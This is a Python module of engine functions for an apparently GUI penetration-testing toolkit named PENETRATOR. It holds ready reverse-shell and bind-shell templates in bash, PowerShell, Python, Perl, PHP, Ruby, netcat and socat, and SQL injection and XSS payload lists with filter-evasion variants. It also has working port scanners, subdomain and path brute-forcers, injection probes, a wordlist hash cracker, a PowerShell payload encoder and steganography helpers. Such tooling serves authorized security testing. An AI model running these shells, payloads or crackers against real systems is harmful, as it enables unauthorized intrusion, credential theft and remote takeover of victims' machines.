"""Pure-logic helpers used by GUI tool frames.

These functions don't print or prompt - they take inputs and call the provided
``log(msg, tag)`` callback. That makes them trivial to wire into any UI.
"""
from __future__ import annotations

import base64
import hashlib
import html as html_mod
import itertools
import re
import secrets
import socket
import string
import struct
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Callable, Iterable

Logger = Callable[..., None]  # log(msg, tag=...)

# Module-level cancellation hook (set by TaskRunner before each run).
# Engine functions can call _should_stop() inside long loops.
_stop_check: Callable[[], bool] | None = None


def set_stop_check(fn: Callable[[], bool] | None) -> None:
    """Install a callable that returns True when the user requested stop."""
    global _stop_check
    _stop_check = fn


def _should_stop() -> bool:
    return _stop_check() if _stop_check is not None else False

# ---------------------------------------------------------------------------
# Constants (shared with CLI modules)
# ---------------------------------------------------------------------------
COMMON_SERVICES = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
    80: "http", 110: "pop3", 135: "msrpc", 139: "netbios", 143: "imap",
    443: "https", 445: "smb", 465: "smtps", 587: "submission", 993: "imaps",
    995: "pop3s", 1433: "mssql", 1521: "oracle", 3306: "mysql", 3389: "rdp",
    5432: "postgresql", 5900: "vnc", 6379: "redis", 8080: "http-alt",
    8443: "https-alt", 27017: "mongodb",
}

COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", "webdisk",
    "admin", "forum", "blog", "login", "api", "dev", "test", "stage", "m",
    "mobile", "shop", "store", "status", "static", "cdn", "assets", "img",
    "images", "download", "downloads", "docs", "help", "support", "portal",
    "vpn", "remote", "cpanel", "secure", "server", "git", "gitlab", "jenkins",
    "grafana", "kibana", "beta", "demo", "staging", "app", "apps", "intranet",
    "news", "media", "video", "chat", "monitor", "jira", "wiki", "sso",
]

DEFAULT_WEB_PATHS = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "wp-content", "wp-includes", "config.php", "config.bak", "config.old",
    "backup", "backup.zip", "backup.tar.gz", ".git", ".git/config", ".env",
    ".htaccess", ".htpasswd", "robots.txt", "sitemap.xml", "phpinfo.php",
    "phpmyadmin", "server-status", "test.php", "info.php", "setup.php",
    "install.php", "shell.php", "upload", "uploads", "images", "assets",
    "api", "api/v1", "api/v2", "users", "user", "profile", "dashboard",
    "console", "manage", "panel", "cpanel", "webmail", "mail",
    "backup.sql", "database.sql", "db.sql", "dump.sql",
    "README.md", "LICENSE", "package.json", "composer.json",
    "debug", "phpmyadmin/index.php", "adminer.php",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "Enforces HTTPS",
    "Content-Security-Policy": "Restricts resource origins",
    "X-Frame-Options": "Anti-clickjacking",
    "X-Content-Type-Options": "MIME sniffing protection",
    "Referrer-Policy": "Controls Referer header",
    "Permissions-Policy": "Browser feature permissions",
    "X-XSS-Protection": "Legacy XSS filter",
}

HASH_SIGNATURES: list[tuple[str, re.Pattern[str]]] = [
    ("MD5",            re.compile(r"^[a-f0-9]{32}$", re.I)),
    ("SHA-1",          re.compile(r"^[a-f0-9]{40}$", re.I)),
    ("SHA-224",        re.compile(r"^[a-f0-9]{56}$", re.I)),
    ("SHA-256",        re.compile(r"^[a-f0-9]{64}$", re.I)),
    ("SHA-384",        re.compile(r"^[a-f0-9]{96}$", re.I)),
    ("SHA-512",        re.compile(r"^[a-f0-9]{128}$", re.I)),
    ("NTLM",           re.compile(r"^[a-f0-9]{32}$", re.I)),
    ("bcrypt",         re.compile(r"^\$2[abxy]\$\d+\$.{53}$")),
    ("Argon2",         re.compile(r"^\$argon2(id|i|d)\$")),
    ("SHA-512 crypt",  re.compile(r"^\$6\$")),
    ("SHA-256 crypt",  re.compile(r"^\$5\$")),
    ("MD5 crypt",      re.compile(r"^\$1\$")),
    ("MySQL 4.1+",     re.compile(r"^\*[A-F0-9]{40}$")),
]

SUPPORTED_HASH_ALGOS = ("md5", "sha1", "sha224", "sha256", "sha384", "sha512")

SQL_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1-- -",
    "\" OR \"1\"=\"1", "') OR ('1'='1", "' UNION SELECT NULL-- ",
    "admin' -- ",
]
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "quoted string not properly terminated",
    "pg_query()", "pg::syntaxerror", "sqlite3::", "ora-00933", "ora-00921",
    "microsoft odbc", "microsoft sql server", "sqlstate", "odbc driver",
]

XSS_PAYLOADS_BASIC = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]
XSS_PAYLOADS_POLYGLOT = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "\"><img src=x onerror=alert(1)>",
    "</script><svg/onload=alert(1)>",
]
XSS_PAYLOADS_WAF = [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<ScRipT>alert(1)</sCrIpT>",
    "<img src=x oneonerrorrror=alert(1)>",
    "<math><brute href=javascript:alert(1)>X</brute>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

REVERSE_SHELL_TEMPLATES = {
    "Bash":          'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    "PowerShell":    '$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$out=(Invoke-Expression $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($out);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()',
    "Python (nix)":  'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])',
    "Python (win)":  'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["cmd.exe"])',
    "Perl":          'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    "PHP":           'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "Ruby":          'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    "Netcat (mkfifo)": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
    "Socat":         'socat tcp-connect:{lhost}:{lport} exec:bash,pty,stderr,setsid,sigint,sane',
}

BIND_SHELL_TEMPLATES = {
    "nc (Linux)":   'nc -lvp {lport} -e /bin/bash',
    "nc (Windows)": 'nc -lvp {lport} -e cmd.exe',
    "ncat":         'ncat -lvp {lport} -e /bin/bash',
    "Python":       'python -c \'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'',
    "Perl":         'perl -e \'use Socket;$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,5);while(1){{accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");}}\'',
}

MAGIC_SIGNATURES: list[tuple[bytes, str]] = [
    (b"\x89PNG\r\n\x1a\n",        "PNG image"),
    (b"\xFF\xD8\xFF",              "JPEG image"),
    (b"GIF87a",                    "GIF image (87a)"),
    (b"GIF89a",                    "GIF image (89a)"),
    (b"BM",                        "BMP image"),
    (b"%PDF",                      "PDF document"),
    (b"PK\x03\x04",                "ZIP / OOXML / JAR"),
    (b"Rar!\x1a\x07\x00",          "RAR v1.5+"),
    (b"Rar!\x1a\x07\x01\x00",      "RAR v5+"),
    (b"\x1f\x8b\x08",              "GZIP"),
    (b"7z\xBC\xAF\x27\x1C",        "7-Zip"),
    (b"MZ",                        "Windows PE executable"),
    (b"\x7FELF",                   "Linux ELF executable"),
    (b"\xCA\xFE\xBA\xBE",          "Java class / Mach-O FAT"),
    (b"\xFE\xED\xFA\xCE",          "Mach-O (32-bit)"),
    (b"\xFE\xED\xFA\xCF",          "Mach-O (64-bit)"),
    (b"SQLite format 3\x00",       "SQLite database"),
    (b"ID3",                       "MP3 (ID3)"),
    (b"OggS",                      "OGG"),
    (b"RIFF",                      "RIFF (WAV/AVI)"),
    (b"fLaC",                      "FLAC audio"),
]

USERNAME_SITES: dict[str, str] = {
    "GitHub":     "https://github.com/{u}",
    "GitLab":     "https://gitlab.com/{u}",
    "Twitter/X":  "https://x.com/{u}",
    "Instagram":  "https://www.instagram.com/{u}/",
    "Reddit":     "https://www.reddit.com/user/{u}",
    "Medium":     "https://medium.com/@{u}",
    "DevTo":      "https://dev.to/{u}",
    "Hashnode":   "https://hashnode.com/@{u}",
    "HackerNews": "https://news.ycombinator.com/user?id={u}",
    "HackerOne":  "https://hackerone.com/{u}",
    "Bugcrowd":   "https://bugcrowd.com/{u}",
    "Twitch":     "https://www.twitch.tv/{u}",
    "YouTube":    "https://www.youtube.com/@{u}",
    "TikTok":     "https://www.tiktok.com/@{u}",
    "Keybase":    "https://keybase.io/{u}",
    "Steam":      "https://steamcommunity.com/id/{u}",
    "StackOverflow": "https://stackoverflow.com/users/{u}",
    "SoundCloud": "https://soundcloud.com/{u}",
    "Vimeo":      "https://vimeo.com/{u}",
    "Pinterest":  "https://www.pinterest.com/{u}/",
}

LEET_MAP = {
    "a": ["a", "A", "4", "@"], "b": ["b", "B", "8"], "e": ["e", "E", "3"],
    "g": ["g", "G", "9"], "i": ["i", "I", "1", "!"], "l": ["l", "L", "1"],
    "o": ["o", "O", "0"], "s": ["s", "S", "5", "$"], "t": ["t", "T", "7"],
    "z": ["z", "Z", "2"],
}

EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@([A-Za-z0-9.-]+\.[A-Za-z]{2,})$")
DELIMITER = "<<<PEN_END>>>"


# ---------------------------------------------------------------------------
# Information Gathering
# ---------------------------------------------------------------------------
def get_service(port: int) -> str:
    try:
        return socket.getservbyport(port, "tcp")
    except OSError:
        return COMMON_SERVICES.get(port, "unknown")


def _check_port(target: str, port: int, timeout: float) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            return sock.connect_ex((target, port)) == 0
    except OSError:
        return False


def scan_ports(target: str, start: int, end: int, threads: int, timeout: float,
               log: Logger) -> list[int]:
    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror as exc:
        log(f"[-] Cannot resolve {target}: {exc}", "err")
        return []
    log(f"[*] Scanning {target} ({ip})  ports {start}-{end}  threads={threads}", "cyan")
    ports = list(range(start, end + 1))
    open_ports: list[int] = []
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(_check_port, ip, p, timeout): p for p in ports}
        for fut in as_completed(futures):
            if _should_stop():
                log("[!] Stop requested - cancelling scan", "warn")
                for f in futures:
                    f.cancel()
                break
            port = futures[fut]
            if fut.result():
                service = get_service(port)
                open_ports.append(port)
                log(f"[+] {port:>5}/tcp   {service}", "ok")
    log(f"[*] Found {len(open_ports)} open port(s) in {time.time()-t0:.2f}s", "cyan")
    return sorted(open_ports)


def resolve_host(host: str, log: Logger) -> list[str]:
    try:
        _, _, ips = socket.gethostbyname_ex(host)
    except socket.gaierror as exc:
        log(f"[-] {exc}", "err")
        return []
    for ip in ips:
        log(f"[+] {host} -> {ip}", "ok")
    return ips


def whois_lookup(domain: str, log: Logger) -> dict:
    try:
        import whois  # type: ignore
    except ImportError:
        log("[-] python-whois not installed. Run: pip install python-whois", "err")
        return {}
    try:
        data = whois.whois(domain)
    except Exception as exc:
        log(f"[-] {exc}", "err")
        return {}
    out: dict[str, str] = {}
    for key, value in data.items():
        if value is None or value == []:
            continue
        if isinstance(value, list):
            value = ", ".join(str(v) for v in value)
        out[str(key)] = str(value)
        log(f"  {key:<22} {value}", "info")
    return out


def dns_lookup(domain: str, log: Logger) -> dict[str, list[str]]:
    try:
        import dns.resolver  # type: ignore
    except ImportError:
        log("[-] dnspython not installed. Run: pip install dnspython", "err")
        return {}
    out: dict[str, list[str]] = {}
    for rtype in ("A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"):
        try:
            answers = dns.resolver.resolve(domain, rtype, lifetime=5)
            values = [str(rdata) for rdata in answers]
        except Exception:
            continue
        out[rtype] = values
        for value in values:
            log(f"  {rtype:<6} {value}", "info")
    if not out:
        log("[!] No DNS records found", "warn")
    return out


def find_subdomains(domain: str, threads: int, log: Logger) -> list[tuple[str, str]]:
    def check(sub: str) -> tuple[str, str] | None:
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            return sub, ip
        except socket.gaierror:
            return None

    log(f"[*] Brute-forcing {len(COMMON_SUBDOMAINS)} subdomains of {domain}", "cyan")
    found: list[tuple[str, str]] = []
    with ThreadPoolExecutor(max_workers=threads) as pool:
        for result in (f.result() for f in as_completed(pool.submit(check, s) for s in COMMON_SUBDOMAINS)):
            if result:
                found.append(result)
                log(f"[+] {result[0]}.{domain} -> {result[1]}", "ok")
    if not found:
        log("[!] No subdomains found", "warn")
    return sorted(found)


def fetch_headers(url: str, log: Logger) -> dict:
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True,
                            headers={"User-Agent": "PENETRATOR/1.0"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return {}
    log(f"[+] {url}  -> {resp.status_code}  final: {resp.url}", "ok")
    headers = dict(resp.headers)
    for k, v in headers.items():
        log(f"  {k}: {v}", "info")
    return headers


# ---------------------------------------------------------------------------
# Password tools
# ---------------------------------------------------------------------------
def identify_hash(value: str) -> list[str]:
    value = value.strip()
    matches = [name for name, pat in HASH_SIGNATURES if pat.match(value)]
    if "MD5" in matches and "NTLM" in matches:
        return ["MD5 / NTLM / LM hash  (32-char hex, context-dependent)"]
    return matches


def crack_hash(value: str, algo: str, wordlist_path: str,
               log: Logger) -> str | None:
    value = value.strip().lower()
    algo = algo.lower()
    if algo not in SUPPORTED_HASH_ALGOS:
        log(f"[-] Unsupported algorithm: {algo}", "err")
        return None
    path = Path(wordlist_path)
    if not path.is_file():
        log(f"[-] Wordlist not found: {wordlist_path}", "err")
        return None
    log(f"[*] Cracking {algo.upper()} using {path}", "cyan")
    tried = 0
    t0 = time.time()
    with path.open("r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            if _should_stop():
                log("[!] Stop requested - aborting crack", "warn")
                return None
            word = line.rstrip("\r\n")
            if not word:
                continue
            tried += 1
            digest = hashlib.new(algo, word.encode("utf-8", errors="ignore")).hexdigest()
            if digest == value:
                log(f"[+] Match found after {tried} attempts: {word}", "ok")
                return word
            if tried % 20000 == 0:
                log(f"    ... tried {tried:,} words", "muted")
    log(f"[-] Not found (tried {tried:,} in {time.time()-t0:.2f}s)", "warn")
    return None


def password_strength(pw: str) -> tuple[int, str]:
    score = 0
    if len(pw) >= 8: score += 1
    if len(pw) >= 12: score += 1
    if re.search(r"[a-z]", pw) and re.search(r"[A-Z]", pw): score += 1
    if re.search(r"\d", pw) and re.search(r"[^A-Za-z0-9]", pw): score += 1
    label = {0: "Very weak", 1: "Weak", 2: "Fair", 3: "Strong", 4: "Very strong"}[score]
    return score, label


def generate_password(length: int, upper: bool, digits: bool, symbols: bool) -> str:
    alphabet = string.ascii_lowercase
    if upper:   alphabet += string.ascii_uppercase
    if digits:  alphabet += string.digits
    if symbols: alphabet += "!@#$%^&*()-_=+[]{};:,.?/"
    return "".join(secrets.choice(alphabet) for _ in range(length))


# ---------------------------------------------------------------------------
# Web attacks
# ---------------------------------------------------------------------------
def buster(url: str, paths: list[str], threads: int, log: Logger) -> list[tuple[int, str]]:
    import requests
    from urllib.parse import urljoin
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/") + "/"

    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})
    found: list[tuple[int, str]] = []

    def check(p: str) -> tuple[int, str] | None:
        target = urljoin(url, p)
        try:
            resp = sess.head(target, timeout=5, allow_redirects=False)
            if resp.status_code == 405:
                resp = sess.get(target, timeout=5, allow_redirects=False)
        except requests.RequestException:
            return None
        if resp.status_code in (200, 201, 202, 204, 301, 302, 307, 401, 403):
            return resp.status_code, target
        return None

    log(f"[*] Busting {url} with {len(paths)} paths  threads={threads}", "cyan")
    with ThreadPoolExecutor(max_workers=threads) as pool:
        for result in (f.result() for f in as_completed(pool.submit(check, p) for p in paths)):
            if result:
                found.append(result)
                log(f"[+] {result[0]}  {result[1]}", "ok")
    log(f"[*] Discovered {len(found)} endpoint(s)", "cyan")
    return sorted(found)


def check_security_headers(url: str, log: Logger) -> dict:
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True,
                            headers={"User-Agent": "PENETRATOR/1.0"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return {}
    result = {}
    for header, purpose in SECURITY_HEADERS.items():
        value = resp.headers.get(header)
        result[header] = value
        if value:
            log(f"[+] {header}: {value}", "ok")
        else:
            log(f"[-] missing: {header}  ({purpose})", "warn")
    return result


def fetch_discovery_files(url: str, log: Logger) -> dict:
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/")
    out: dict[str, tuple[int, str]] = {}
    for path in ("robots.txt", "sitemap.xml", "security.txt", ".well-known/security.txt"):
        target = f"{url}/{path}"
        try:
            resp = requests.get(target, timeout=8,
                                headers={"User-Agent": "PENETRATOR/1.0"})
        except requests.RequestException:
            continue
        out[path] = (resp.status_code, resp.text)
        tag = "ok" if resp.status_code == 200 and resp.text.strip() else "muted"
        log(f"[{resp.status_code}] {target}", tag)
        if resp.status_code == 200 and resp.text.strip():
            preview = "\n".join(resp.text.splitlines()[:40])
            log(preview, "muted")
    return out


def detect_tech(url: str, log: Logger) -> dict:
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True,
                            headers={"User-Agent": "PENETRATOR/1.0"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return {}
    findings: dict[str, str] = {}
    for header in ("Server", "X-Powered-By", "Via"):
        if header in resp.headers:
            findings[header] = resp.headers[header]
    sigs = {
        "WordPress": [r"/wp-content/", r"/wp-includes/"],
        "Drupal": [r"Drupal.settings", r"/sites/default/"],
        "Joomla": [r"/media/jui/", r"Joomla!"],
        "Laravel": [r"laravel_session"],
        "Django": [r"csrftoken"],
        "Magento": [r"/static/version", r"Mage\."],
        "Shopify": [r"cdn\.shopify\.com"],
        "React": [r"__REACT_DEVTOOLS"],
        "Vue.js": [r"__VUE"],
        "Angular": [r"ng-version"],
        "jQuery": [r"jquery(?:\.min)?\.js"],
        "Bootstrap": [r"bootstrap(?:\.min)?\.css"],
        "Cloudflare": [r"cloudflare", r"cf-ray"],
    }
    body = resp.text[:200000]
    headers_blob = "\n".join(f"{k}:{v}" for k, v in resp.headers.items())
    for tech, patterns in sigs.items():
        for pattern in patterns:
            if re.search(pattern, body, re.I) or re.search(pattern, headers_blob, re.I):
                findings[tech] = "detected"
                break
    for k, v in findings.items():
        log(f"[+] {k}: {v}", "ok")
    if not findings:
        log("[!] No technology fingerprint detected", "warn")
    return findings


# ---------------------------------------------------------------------------
# SQL injection detection (light)
# ---------------------------------------------------------------------------
def sqli_detect(url: str, log: Logger) -> list[tuple[str, str, str]]:
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        log("[-] URL has no query parameters to test.", "err")
        return []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})
    findings: list[tuple[str, str, str]] = []
    for param in params:
        log(f"[*] Testing parameter: {param}", "cyan")
        for payload in SQL_PAYLOADS:
            mutated = dict(params); mutated[param] = params[param] + payload
            test_url = urlunparse(parsed._replace(query=urlencode(mutated)))
            try:
                resp = sess.get(test_url, timeout=10, allow_redirects=False)
            except requests.RequestException:
                continue
            body = resp.text.lower()
            for sig in SQL_ERROR_SIGNATURES:
                if sig in body:
                    findings.append((param, payload, sig))
                    log(f"[+] {param}  payload={payload}  indicator={sig}", "ok")
                    break
    if not findings:
        log("[!] No obvious SQL injection indicator found", "warn")
    return findings


# ---------------------------------------------------------------------------
# XSS encoding + reflected scanner
# ---------------------------------------------------------------------------
def xss_encodings(payload: str) -> dict[str, str]:
    data = payload.encode()
    return {
        "URL": urllib.parse.quote(payload, safe=""),
        "URL (full)": urllib.parse.quote_plus(payload),
        "HTML entity": html_mod.escape(payload, quote=True),
        "HTML numeric": "".join(f"&#{ord(c)};" for c in payload),
        "Hex (\\x)": "".join(f"\\x{ord(c):02x}" for c in payload),
        "Unicode (\\u)": "".join(f"\\u{ord(c):04x}" for c in payload),
        "Base64": base64.b64encode(data).decode(),
    }


def xss_reflected(url: str, log: Logger) -> list[tuple[str, str]]:
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        log("[-] URL has no query parameters to test.", "err")
        return []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})
    findings: list[tuple[str, str]] = []
    marker = "penetx1337"
    for param in params:
        log(f"[*] Testing parameter: {param}", "cyan")
        for payload in XSS_PAYLOADS_BASIC:
            marked = payload.replace("alert(1)", f"alert('{marker}')")
            mutated = dict(params); mutated[param] = marked
            test_url = urlunparse(parsed._replace(query=urlencode(mutated, safe="<>\"'/=()")))
            try:
                resp = sess.get(test_url, timeout=8, allow_redirects=False)
            except requests.RequestException:
                continue
            if marked in resp.text:
                findings.append((param, marked))
                log(f"[+] Reflected: {marked}", "ok")
    if not findings:
        log("[!] No reflected payloads detected", "warn")
    return findings


# ---------------------------------------------------------------------------
# Payload encoders
# ---------------------------------------------------------------------------
def encode_payload(text: str) -> dict[str, str]:
    data = text.encode()
    return {
        "Base64": base64.b64encode(data).decode(),
        "Base64 (url-safe)": base64.urlsafe_b64encode(data).decode(),
        "Hex": data.hex(),
        "Hex (spaced)": " ".join(f"{b:02x}" for b in data),
        "PowerShell UTF16LE B64": base64.b64encode(text.encode("utf-16le")).decode(),
        "URL-encoded": urllib.parse.quote(text, safe=""),
    }


# ---------------------------------------------------------------------------
# Steganography (LSB + whitespace)
# ---------------------------------------------------------------------------
def _text_to_bits(text: str) -> str:
    return "".join(f"{byte:08b}" for byte in text.encode("utf-8"))


def _bits_to_text(bits: str) -> str:
    out = bytearray()
    for i in range(0, len(bits) - 7, 8):
        out.append(int(bits[i:i + 8], 2))
    return out.decode("utf-8", errors="ignore")


def image_hide(cover: str, message: str, output: str, log: Logger) -> str | None:
    try:
        from PIL import Image
    except ImportError:
        log("[-] Pillow not installed. Run: pip install Pillow", "err")
        return None
    src = Path(cover)
    if not src.is_file():
        log(f"[-] Cover not found: {cover}", "err")
        return None
    image = Image.open(src).convert("RGB")
    pixels = list(image.getdata())
    bits = _text_to_bits(message + DELIMITER)
    if len(bits) > len(pixels) * 3:
        log("[-] Cover image too small for the message", "err")
        return None
    new_pixels: list[tuple[int, int, int]] = []
    bi = 0
    for r, g, b in pixels:
        if bi < len(bits): r = (r & ~1) | int(bits[bi]); bi += 1
        if bi < len(bits): g = (g & ~1) | int(bits[bi]); bi += 1
        if bi < len(bits): b = (b & ~1) | int(bits[bi]); bi += 1
        new_pixels.append((r, g, b))
    image.putdata(new_pixels)
    out = Path(output)
    image.save(out, format="PNG")
    log(f"[+] Saved {out}", "ok")
    return str(out)


def image_extract(stego: str, log: Logger) -> str | None:
    try:
        from PIL import Image
    except ImportError:
        log("[-] Pillow not installed. Run: pip install Pillow", "err")
        return None
    src = Path(stego)
    if not src.is_file():
        log(f"[-] File not found: {stego}", "err")
        return None
    image = Image.open(src).convert("RGB")
    bits: list[str] = []
    for r, g, b in image.getdata():
        bits.append(str(r & 1)); bits.append(str(g & 1)); bits.append(str(b & 1))
    text = _bits_to_text("".join(bits))
    if DELIMITER in text:
        msg = text.split(DELIMITER, 1)[0]
        log(f"[+] Extracted: {msg}", "ok")
        return msg
    log("[-] No embedded message found", "warn")
    return None


def ws_hide(cover: str, message: str, output: str, log: Logger) -> str | None:
    src = Path(cover)
    if not src.is_file():
        log(f"[-] Cover not found: {cover}", "err")
        return None
    bits = _text_to_bits(message + DELIMITER)
    lines = src.read_text(encoding="utf-8", errors="ignore").splitlines()
    if len(bits) > len(lines):
        lines.extend(["."] * (len(bits) - len(lines)))
    stamped = []
    for idx, line in enumerate(lines):
        stripped = line.rstrip()
        if idx < len(bits):
            stripped += "\t" if bits[idx] == "1" else " "
        stamped.append(stripped)
    out = Path(output)
    out.write_text("\n".join(stamped) + "\n", encoding="utf-8")
    log(f"[+] Saved {out}", "ok")
    return str(out)


def ws_extract(stego: str, log: Logger) -> str | None:
    src = Path(stego)
    if not src.is_file():
        log(f"[-] File not found: {stego}", "err")
        return None
    bits: list[str] = []
    for line in src.read_text(encoding="utf-8", errors="ignore").splitlines():
        if line.endswith("\t"): bits.append("1")
        elif line.endswith(" "): bits.append("0")
    text = _bits_to_text("".join(bits))
    if DELIMITER in text:
        msg = text.split(DELIMITER, 1)[0]
        log(f"[+] Extracted: {msg}", "ok")
        return msg
    log("[-] No embedded message found", "warn")
    return None


# ---------------------------------------------------------------------------
# Reverse engineering + forensic
# ---------------------------------------------------------------------------
def extract_strings(path: str, min_len: int, log: Logger) -> list[tuple[int, str]]:
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return []
    data = p.read_bytes()
    results: list[tuple[int, str]] = []
    current = bytearray(); start = 0
    for i, byte in enumerate(data):
        if 32 <= byte < 127:
            if not current: start = i
            current.append(byte)
        else:
            if len(current) >= min_len:
                results.append((start, current.decode("ascii", errors="ignore")))
            current = bytearray()
    if len(current) >= min_len:
        results.append((start, current.decode("ascii", errors="ignore")))
    log(f"[*] {len(results)} ASCII strings >= {min_len} chars", "cyan")
    return results


def parse_pe(path: str, log: Logger) -> dict:
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return {}
    data = p.read_bytes()
    if len(data) < 0x40 or data[:2] != b"MZ":
        log("[-] Not a PE file (missing MZ header)", "err")
        return {}
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    if data[pe_offset:pe_offset + 4] != b"PE\0\0":
        log("[-] Invalid PE signature", "err")
        return {}
    machine, num_sections, timestamp, _, _, opt_hdr_size, characteristics = \
        struct.unpack_from("<HHIIIHH", data, pe_offset + 4)
    machines = {0x14c: "x86", 0x8664: "x64", 0x1c0: "ARM", 0xaa64: "ARM64"}
    out: dict = {
        "size": len(data),
        "machine": machines.get(machine, f"0x{machine:x}"),
        "sections": num_sections,
        "timestamp": timestamp,
        "characteristics": f"0x{characteristics:x}",
        "sec_table": [],
    }
    log(f"[+] Machine: {out['machine']}  sections: {num_sections}", "ok")
    sec_offset = pe_offset + 24 + opt_hdr_size
    for i in range(num_sections):
        off = sec_offset + i * 40
        if off + 40 > len(data): break
        name = data[off:off + 8].rstrip(b"\x00").decode("ascii", errors="replace")
        vsize, vaddr, rsize, rptr = struct.unpack_from("<IIII", data, off + 8)
        out["sec_table"].append((name, vsize, vaddr, rsize, rptr))
        log(f"  {name:<10} vsize=0x{vsize:x} vaddr=0x{vaddr:x} raw=0x{rsize:x}@0x{rptr:x}", "info")
    return out


def hex_dump(path: str, offset: int, length: int, log: Logger) -> str:
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return ""
    with p.open("rb") as fh:
        fh.seek(offset)
        chunk = fh.read(length)
    lines = []
    for i in range(0, len(chunk), 16):
        row = chunk[i:i + 16]
        hex_part = " ".join(f"{b:02x}" for b in row).ljust(16 * 3)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in row)
        line = f"{offset + i:08x}  {hex_part}  {ascii_part}"
        lines.append(line)
        log(line, "muted")
    return "\n".join(lines)


def file_hashes(path: str, log: Logger) -> dict[str, str]:
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return {}
    hashers = {name: hashlib.new(name) for name in ("md5", "sha1", "sha256", "sha512")}
    with p.open("rb") as fh:
        for chunk in iter(lambda: fh.read(65536), b""):
            for h in hashers.values():
                h.update(chunk)
    out = {name: h.hexdigest() for name, h in hashers.items()}
    log(f"[*] File: {p.name}  size: {p.stat().st_size:,} bytes", "cyan")
    for name, digest in out.items():
        log(f"  {name.upper():<7} {digest}", "info")
    return out


